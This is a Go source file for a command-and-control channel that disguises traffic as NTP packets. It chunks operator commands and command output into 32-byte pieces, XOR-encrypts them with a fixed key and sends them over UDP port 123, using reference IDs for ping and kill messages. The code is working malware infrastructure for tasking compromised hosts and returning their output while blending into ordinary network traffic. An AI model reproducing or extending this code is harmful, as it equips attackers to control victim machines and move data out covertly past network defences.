package common

import (
	"bytes"
	"log"
	"net"
	"strconv"
)

const (
	// NTP protocol constants
	NTPPort = 123
)

// Packet represents a basic NTP packet used for C2 communication
type Packet struct {
	Destination string
	Baseline    []byte
	Command     string
	RefID       string
}

// NewPacket creates a new NTP packet
func NewPacket(destination string) *Packet {
	return &Packet{
		Destination: destination,
		Baseline:    []byte{0x1a, 0x01, 0x0a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	}
}

// NewCommandPacket creates a new command packet
func NewCommandPacket(destination, command string) *Packet {
	p := NewPacket(destination)
	p.Command = command
	return p
}

// NewReferencePacket creates a new reference packet (ping, kill, etc.)
func NewReferencePacket(destination, refID string) *Packet {
	p := NewPacket(destination)
	p.RefID = refID
	return p
}

// NewOutputPacket creates a new packet for command output
func NewOutputPacket(destination, output string) *Packet {
	p := NewPacket(destination)
	p.Command = output
	return p
}

// ChunkAndSendCommand chunks a command into multiple packets if needed
func (p *Packet) ChunkAndSendCommand() error {
	if len(p.Command) == 0 {
		return nil
	}

	// Split command into 32-byte chunks
	var chunks []string
	cmdLen := len(p.Command)

	for i := 0; i < cmdLen; i += 32 {
		end := i + 32
		if end > cmdLen {
			end = cmdLen
		}
		chunks = append(chunks, p.Command[i:end])
	}

	// Send each chunk
	for i, chunk := range chunks {
		refID := CommandContinued
		if i == len(chunks)-1 {
			refID = CommandDone
		}

		err := p.SendPacket(refID, chunk)
		if err != nil {
			return err
		}
	}

	return nil
}

// ChunkAndSendOutput chunks and sends command output
func (p *Packet) ChunkAndSendOutput() error {
	if len(p.Command) == 0 {
		log.Printf("DEBUG-PACKET-1: Empty command output, nothing to send")
		return nil
	}

	// Split output into 32-byte chunks
	var chunks []string
	outputLen := len(p.Command)
	log.Printf("DEBUG-PACKET-2: Splitting %d bytes into chunks of 32 bytes", outputLen)

	for i := 0; i < outputLen; i += 32 {
		end := i + 32
		if end > outputLen {
			end = outputLen
		}
		chunks = append(chunks, p.Command[i:end])
	}

	log.Printf("DEBUG-PACKET-3: Created %d chunks to send", len(chunks))

	// Send each chunk
	for i, chunk := range chunks {
		refID := CommandContinued // Output unfinished
		if i == len(chunks)-1 {
			refID = CommandOutput // Output finished
		}

		log.Printf("DEBUG-PACKET-4: Sending chunk %d/%d (type: %s, length: %d)",
			i+1, len(chunks), refID, len(chunk))

		err := p.SendPacket(refID, chunk)
		if err != nil {
			log.Printf("DEBUG-PACKET-5: ERROR sending chunk %d: %v", i+1, err)
			return err
		}
		log.Printf("DEBUG-PACKET-6: Successfully sent chunk %d", i+1)
	}

	log.Printf("DEBUG-PACKET-7: All %d chunks sent successfully", len(chunks))
	return nil
}

// SendReferencePacket sends a reference packet (PING, KILL)
func (p *Packet) SendReferencePacket() error {
	return p.SendPacket(p.RefID, "")
}

// SendPacket sends an NTP packet with the given reference ID and payload
func (p *Packet) SendPacket(refID, payload string) error {
	log.Printf("DEBUG-UDP-1: Preparing to send packet with refID '%s' to %s",
		refID, p.Destination)

	// Add padding to payload if needed
	paddedPayload := payload
	if len(paddedPayload) < 32 {
		paddedPayload += string(bytes.Repeat([]byte{0}, 32-len(paddedPayload)))
		log.Printf("DEBUG-UDP-2: Padded payload to 32 bytes")
	}

	// Create the packet
	buf := new(bytes.Buffer)
	buf.Write(p.Baseline)
	buf.WriteString(refID)

	// XOR encrypt the payload with the '.' key
	encryptedPayload := XOREncrypt([]byte(paddedPayload), '.')
	buf.Write(encryptedPayload)

	log.Printf("DEBUG-UDP-3: Packet assembled, total length: %d bytes", buf.Len())

	// Create UDP connection
	log.Printf("DEBUG-UDP-4: Connecting to %s:%d", p.Destination, NTPPort)
	conn, err := net.Dial("udp", net.JoinHostPort(p.Destination, strconv.Itoa(NTPPort)))
	if err != nil {
		log.Printf("DEBUG-UDP-5: ERROR establishing UDP connection: %v", err)
		return err
	}
	defer conn.Close()

	// Send the packet
	bytesSent, err := conn.Write(buf.Bytes())
	if err != nil {
		log.Printf("DEBUG-UDP-6: ERROR sending packet: %v", err)
		return err
	}

	log.Printf("DEBUG-UDP-7: Successfully sent %d bytes to %s:%d",
		bytesSent, p.Destination, NTPPort)
	return nil
}
